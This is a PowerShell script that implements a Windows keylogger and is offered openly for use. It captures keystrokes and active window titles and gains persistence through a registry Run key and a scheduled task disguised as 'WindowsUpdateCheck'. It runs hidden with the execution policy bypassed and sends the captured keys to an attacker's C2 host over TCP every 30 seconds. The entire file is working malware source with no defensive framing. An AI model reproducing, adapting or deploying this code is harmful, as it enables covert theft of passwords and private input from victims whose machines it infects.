# keylog_persist.ps1
# Windows keylogger + persistence via registry + scheduled task
# usage: powershell -ExecutionPolicy Bypass -File keylog_persist.ps1 -C2Host 1.2.3.4 -C2Port 4444

param(
    [string]$C2Host = "YOUR_C2_IP",
    [int]   $C2Port = 4444,
    [int]   $DumpInterval = 30   # seconds between key dumps to C2
)

# ── API imports ───────────────────────────────────────────────────────────────
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class KeyHook {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr h, StringBuilder t, int max);
}
"@

# ── persistence ───────────────────────────────────────────────────────────────
function Install-Persist {
    $self = $MyInvocation.ScriptName
    if (-not $self) { $self = $PSCommandPath }

    # registry run key
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsTaskHelper" `
        -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$self`" -C2Host $C2Host -C2Port $C2Port"

    # scheduled task (every 5 min)
    $action  = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$self`" -C2Host $C2Host -C2Port $C2Port"
    $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
    Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action `
        -Trigger $trigger -RunLevel Highest -Force 2>$null

    Write-Host "[+] persistence installed" -ForegroundColor Green
}

# ── keylogger ─────────────────────────────────────────────────────────────────
$keyBuffer = [System.Text.StringBuilder]::new()
$lastWindow = ""

$keyMap = @{
    8="[BS]"; 9="[TAB]"; 13="[ENTER]"; 27="[ESC]"; 32=" ";
    37="[LEFT]"; 38="[UP]"; 39="[RIGHT]"; 40="[DOWN]";
    46="[DEL]"; 160="[SHIFT]"; 162="[CTRL]"; 164="[ALT]";
}
for ($i=65; $i-le 90; $i++) { $keyMap[$i] = [char]$i }
for ($i=48; $i-le 57; $i++) { $keyMap[$i] = [char]$i }

function Get-Keys {
    $sb = [System.Text.StringBuilder]::new()

    # window title
    $hwnd = [KeyHook]::GetForegroundWindow()
    $title = [System.Text.StringBuilder]::new(256)
    [KeyHook]::GetWindowText($hwnd, $title, 256) | Out-Null
    $titleStr = $title.ToString()
    if ($titleStr -ne $script:lastWindow) {
        $sb.Append("`n[WIN: $titleStr]`n") | Out-Null
        $script:lastWindow = $titleStr
    }

    # key states
    for ($vk=8; $vk-le 222; $vk++) {
        $state = [KeyHook]::GetAsyncKeyState($vk)
        if ($state -band 0x0001) {
            if ($keyMap.ContainsKey($vk)) {
                $sb.Append($keyMap[$vk]) | Out-Null
            }
        }
    }
    return $sb.ToString()
}

# ── C2 send ───────────────────────────────────────────────────────────────────
function Send-ToC2 ($data) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($C2Host, $C2Port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $payload = "KEYLOG|" + $env:COMPUTERNAME + "|" + $data
        $writer.WriteLine($payload)
        $client.Close()
    } catch {}
}

# ── main ──────────────────────────────────────────────────────────────────────
Install-Persist

$lastDump = Get-Date
while ($true) {
    $keys = Get-Keys
    if ($keys) { $keyBuffer.Append($keys) | Out-Null }

    if (((Get-Date) - $lastDump).TotalSeconds -ge $DumpInterval) {
        $dump = $keyBuffer.ToString()
        if ($dump.Length -gt 0) {
            Send-ToC2 $dump
            $keyBuffer.Clear()
        }
        $lastDump = Get-Date
    }
    Start-Sleep -Milliseconds 10
}
